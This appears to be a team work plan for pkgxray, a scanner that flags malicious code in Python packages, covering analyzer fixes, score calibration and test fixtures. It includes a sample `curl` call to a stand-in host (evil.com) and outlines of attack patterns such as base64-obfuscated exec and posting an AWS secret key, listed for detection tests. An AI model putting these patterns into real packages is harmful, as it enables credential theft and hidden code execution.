# pkgxray — Work Plan v0.3.x

This document lists every task to be done, who owns it, and its priority. Update status as work progresses.

**Statuses:** `pending` | `in progress` | `in review` | `done`

---

## Person A — Analyzer Correctness

Fixes false positives and false negatives inside the individual analyzer files.
Branch prefix: `fix/analyzer-*`

---

### A1 — Fix `filesystem.py`: `list.remove()` false positive
**Status:** `pending`
**Priority:** HIGH
**File:** `src/pkgxray/analyzers/filesystem.py`

**Problem:**
Any call to `.remove()` is flagged as a destructive filesystem operation, regardless of the receiver object. This means `my_list.remove(x)` is flagged the same as `os.remove(path)`. This is one of the clearest sources of false positives in clean packages.

**What to do:**
Only flag `.remove()` and `.unlink()` when the receiver is `os` or `pathlib`. `shutil.rmtree()` can remain unrestricted since `rmtree` is unambiguous.

**Acceptance criteria:**
- `my_list.remove(x)` → no finding
- `os.remove(path)` → HIGH finding
- `Path("f").unlink()` → HIGH finding
- `shutil.rmtree(dir)` → HIGH finding (unchanged)
- All covered by tests in `tests/test_analyzers/test_filesystem.py`

---

### A2 — Fix `network.py`: chained attribute receiver not detected
**Status:** `pending`
**Priority:** HIGH
**File:** `src/pkgxray/analyzers/network.py`

**Problem:**
The receiver of a method call is only extracted when it is a simple `ast.Name` node (a bare variable name). When the receiver is a chained attribute like `self.session`, `func.value` is an `ast.Attribute` node, so the receiver becomes an empty string and the call is not flagged.

```python
self.session.get(url)   # NOT detected — receiver is ast.Attribute
requests.get(url)       # detected — receiver is ast.Name
```

This is a systematic false negative for any HTTP client stored as an object attribute.

**What to do:**
Write a small helper that recursively extracts the last attribute name from an `ast.Attribute` chain (e.g., `self.session` → `"session"`). Use it as a fallback when the receiver is not a bare `ast.Name`.

**Acceptance criteria:**
- `self.session.get(url)` → HIGH finding
- `self.client.post(url)` → HIGH finding
- `self.db.connect()` → no finding (db is in the exclude list)
- `dict.get(key)` → no finding (receiver not in known HTTP clients)
- All covered by tests in `tests/test_analyzers/test_network.py`

---

### A3 — Fix `dynamic_imports.py`: receiver not verified + severity noise
**Status:** `pending`
**Priority:** HIGH
**File:** `src/pkgxray/analyzers/dynamic_imports.py`

**Problem:**
Two issues:
1. Any `obj.import_module()` call is flagged regardless of the receiver. The check only looks at `func.attr == "import_module"` without verifying the receiver is `importlib`. A third-party object with a method named `import_module` would produce a false positive.
2. `importlib.import_module("os")` with a hardcoded string literal is flagged at MEDIUM. This pattern is used by legitimate plugin loaders and should be LOW or not flagged at all.

**What to do:**
1. Add a receiver check: only flag `import_module` when the receiver is `importlib` (i.e., `func.value.id == "importlib"`).
2. Lower the severity for `importlib.import_module("literal_string")` from MEDIUM to LOW — or consider removing it entirely since it is functionally equivalent to a normal `import` statement.

**Acceptance criteria:**
- `importlib.import_module("os")` → LOW (or no finding)
- `importlib.import_module(user_input)` → HIGH
- `some_obj.import_module("x")` → no finding
- `__import__("os")` → HIGH (unchanged)
- All covered by tests in `tests/test_analyzers/test_dynamic_imports.py`

---

### A4 — Fix `base.py`: class body misclassified as not module-level
**Status:** `pending`
**Priority:** MEDIUM
**File:** `src/pkgxray/analyzers/base.py`

**Problem:**
`is_module_level()` returns `False` for any node that has a `ClassDef` ancestor. But code in a class body (outside any method) runs at import time when the class is defined — it should be treated as module-level for severity escalation purposes.

```python
class Foo:
    subprocess.run(["curl", "http://evil.com"])  # runs at import — should be CRITICAL, currently HIGH
```

**What to do:**
Modify `is_module_level()` to only return `False` for `FunctionDef` and `AsyncFunctionDef` ancestors. A `ClassDef` ancestor should not prevent module-level classification.

**Acceptance criteria:**
- Dangerous call inside a class body → CRITICAL
- Dangerous call inside a method → HIGH
- Dangerous call at true module level → CRITICAL (unchanged)
- Existing tests in `tests/test_analyzers/` still pass

---

### A5 — Write tests for all A1–A4 fixes
**Status:** `pending`
**Priority:** HIGH
**Files:** `tests/test_analyzers/test_filesystem.py`, `test_network.py`, `test_dynamic_imports.py`

Each fix above needs test cases covering:
- The false positive that was being generated (must now produce no finding)
- The true positive that must still be detected
- The edge case that triggered the discovery

---

## Person B — Scoring + Config File Analysis

Recalibrates the risk scorer and adds real parsing for `pyproject.toml` and `setup.cfg`.
Branch prefix: `fix/scorer-*` or `feat/config-analyzer`

---

### B1 — Recalibrate the scorer
**Status:** `pending`
**Priority:** HIGH
**File:** `src/pkgxray/scorer.py`

**Problem:**
`MAX_SCORE_PER_ANALYZER = 20` is too permissive. With 8 analyzers each contributing up to 20 points, a package that triggers 5+ analyzers at any severity level reaches CRITICAL (100). Legitimate packages like `requests` and `paramiko` hit HIGH/CRITICAL purely because they do what they are supposed to do.

**What to do:**
1. Run `pkgxray scan` against at least 10 known-clean packages (suggestions: `more-itertools`, `attrs`, `click`, `requests`, `paramiko`, `boto3`, `django`, `flask`, `sqlalchemy`, `pytest`). Record their raw scores.
2. Using those scores as a baseline, decide on new per-analyzer caps and/or threshold values.
3. Two levers to adjust:
   - `MAX_SCORE_PER_ANALYZER` (lower it, e.g. 10–12)
   - The level thresholds (currently 0–20 LOW, 21–40 MODERATE, 41–70 HIGH, 71–100 CRITICAL)
4. Target: `requests` should score MODERATE, `paramiko` HIGH at most.

**Acceptance criteria:**
- `more-itertools` → LOW
- `attrs` → LOW
- `requests` → MODERATE
- `click` → LOW or MODERATE
- `paramiko` → HIGH (not CRITICAL)
- A synthetic malicious package (from Person C's fixtures) → CRITICAL
- Update `docs/ADR.md` section ADR-004 with the new values and the empirical baseline that justified them

---

### B2 — Add TOML parsing for `pyproject.toml`
**Status:** `pending`
**Priority:** MEDIUM
**Files:** `src/pkgxray/extractor.py`, new `src/pkgxray/analyzers/config_files.py`

**Problem:**
`pyproject.toml` and `setup.cfg` are extracted but passed to `ast.parse()`, which always fails on them silently. They contain real attack surface: malicious `[project.scripts]` entrypoints, dangerous `[build-system.requires]` packages, or suspicious `[tool.*]` configurations.

**What to do:**
1. In `extractor.py`, detect `pyproject.toml` and `setup.cfg` separately and do not attempt `ast.parse()` on them. Instead, pass their raw text to a dedicated config analyzer.
2. Create `analyzers/config_files.py` that uses:
   - `tomllib` (Python 3.11+ stdlib) or `tomli` (backport, add as optional dep for 3.9–3.10) for TOML
   - `configparser` (stdlib) for `setup.cfg`
3. Detect: unusual `[build-system.requires]` packages, scripts that invoke shell commands, suspicious entrypoints.

**Acceptance criteria:**
- `pyproject.toml` is no longer silently skipped
- A `pyproject.toml` with a malicious `[project.scripts]` entry → at least one finding
- `setup.cfg` with a suspicious `scripts` entry → at least one finding
- Tests in `tests/test_analyzers/test_config_files.py`

---

### B3 — Surface skipped files in `ScanResult`
**Status:** `pending`
**Priority:** MEDIUM
**Files:** `src/pkgxray/analyzers/base.py`, `src/pkgxray/scanner.py`, `src/pkgxray/reporter.py`

**Problem:**
When `_parse_ast()` fails (syntax error, unsupported Python version), the file is silently dropped. The user gets no indication that some files were not analyzed. A package using Python 3.12 `match/case` syntax scanned on Python 3.9 will appear clean even if those files contain malicious code.

**What to do:**
1. Add a `skipped_files: list` field to `ScanResult`.
2. When `_parse_ast()` returns `None`, record the filename and reason (`"syntax_error"` or `"parse_failed"`) in the scan result instead of silently continuing.
3. Display skipped files in the terminal and HTML reports with a warning.

**Acceptance criteria:**
- A file with invalid Python syntax → appears in `result.skipped_files`
- Terminal report shows a warning when `skipped_files` is not empty
- `ScanResult` JSON output includes `skipped_files`

---

## Person C — Infrastructure, Fixtures & Research

Builds the test foundation that the other two people depend on, and researches the hard problems.
Branch prefix: `test/*` or `chore/*` or `docs/adr-*`

---

### C1 — Create synthetic malicious package fixtures
**Status:** `pending`
**Priority:** HIGH (blocks B1 calibration)
**Files:** new `tests/fixtures/`

**Problem:**
There are no ground-truth test cases for "this package must score CRITICAL" or "this package must score LOW". Without these, calibration changes (B1) and analyzer fixes (A1–A4) have no objective validation.

**What to do:**
Create a set of small Python packages as string fixtures (no real download needed) that simulate specific attack patterns:

| Fixture | Pattern | Expected result |
|---------|---------|-----------------|
| `malicious_module_level.py` | `subprocess.Popen(...)` at module level | CRITICAL |
| `malicious_obfuscated.py` | `exec(base64.b64decode(...))` | CRITICAL |
| `malicious_env_exfil.py` | `os.getenv("AWS_SECRET_KEY")` + `requests.post(...)` | HIGH/CRITICAL |
| `malicious_setup_hook.py` | `class CustomInstall(install): def run(self): ...` | CRITICAL |
| `clean_cli_tool.py` | `click`, `os.getenv("HOME")`, `subprocess.run(["git", ...])` in a function | LOW/MODERATE |
| `clean_http_client.py` | `requests.get(...)` inside a function | MODERATE |

These fixtures are used by both unit tests (per-analyzer) and integration tests (full scorer).

---

### C2 — Integration tests using fixtures
**Status:** `pending`
**Priority:** HIGH
**Files:** new `tests/test_integration.py`

Using the fixtures from C1, write end-to-end tests that call `scanner.scan()` (or directly invoke the pipeline with the fixture content) and assert on the final `risk_level` and `risk_score` range.

**Acceptance criteria:**
- All malicious fixtures → `risk_level == "CRITICAL"` or `risk_level == "HIGH"` (after B1 calibration)
- All clean fixtures → `risk_level == "LOW"` or `risk_level == "MODERATE"`
- Tests run without network access (use fixtures, no real PyPI download)
- Tests are marked with `@pytest.mark.integration` (not `slow`) so they run in CI without hitting the network

---

### C3 — Research binary analysis for precompiled extensions
**Status:** `pending`
**Priority:** MEDIUM (research only — no code yet)
**Output:** New ADR entry in `docs/ADR.md`

**Problem:**
`.so`, `.pyd`, and `.dll` files inside packages are completely invisible to the current AST-based analysis. A C extension that calls `execve()` or opens a network connection would be undetected.

**What to do (research, not implementation):**
Evaluate the following approaches and write up findings as a new ADR (ADR-008):
- `strings` command: extracts printable strings from binaries — can find hardcoded IPs, URLs, shell commands
- `pyelftools`: Python library for ELF parsing — can list imported symbols (e.g., `socket`, `execve`)
- `pefile`: same for Windows PE files
- Feasibility within the no-install constraint (these tools do not execute the binary)
- Performance impact on scan time

**Acceptance criteria:**
- `docs/ADR.md` has a new ADR-008 with a clear recommendation (implement / defer / out of scope) and rationale

---

### C4 — Fix version string inconsistencies
**Status:** `pending`
**Priority:** LOW
**Files:** `src/pkgxray/downloader.py`, `src/pkgxray/cli.py`

Two hardcoded version strings were not updated when the package moved from 0.1.0 to 0.2.2:
- `downloader.py`: `User-Agent` header is `pkgxray/0.1.0`
- `cli.py`: `@click.version_option(version="0.1.0")`

**What to do:**
Read the version from `pkgxray.__version__` dynamically instead of hardcoding it.

**Acceptance criteria:**
- `pkgxray --version` outputs `0.2.2`
- `User-Agent` header sent to PyPI is `pkgxray/0.2.2`

---

### C5 — Remove `ExtractedFile.is_setup` dead code
**Status:** `pending`
**Priority:** LOW
**File:** `src/pkgxray/extractor.py`, `src/pkgxray/analyzers/base.py`

`ExtractedFile.is_setup` is set correctly in the extractor but never read by any analyzer or the orchestrator. The orchestrator uses a string check on the filename instead. Either use the flag or remove it.

**Acceptance criteria:**
- Either the flag is used in `scanner.py` to route files to `SetupScriptAnalyzer` (replacing the string check), or the field is removed entirely
- No dead code remains

---

## Shared / Ongoing

These are not assigned to one person — anyone can pick them up as capacity allows.

| Task | Description | Priority |
|------|-------------|----------|
| **Allowlist flag** | Add `--allow analyzer:pattern` CLI flag so CI pipelines can suppress known-acceptable findings | LOW |
| **Finding deduplication** | When the same pattern appears in many files, group them into one finding with a `count` field to reduce report noise | LOW |
| **Caching** | Add a simple disk cache so scanning the same package+version twice does not re-download | LOW |
| **Refactor if/else in analyzers** | Extract detection rules into data-driven tables to reduce branching — do this after all correctness fixes are merged | LOW |

---

## Definition of Done (for any task)

A task is done when:
1. The code change is merged to `main` via a reviewed PR
2. At least one new test covers the specific case that was fixed
3. All existing tests still pass in Docker (`docker compose run test`)
4. If it changes a design decision, `docs/ADR.md` is updated
5. `docs/QUANTA.md` known-issues table is updated to reflect the fix
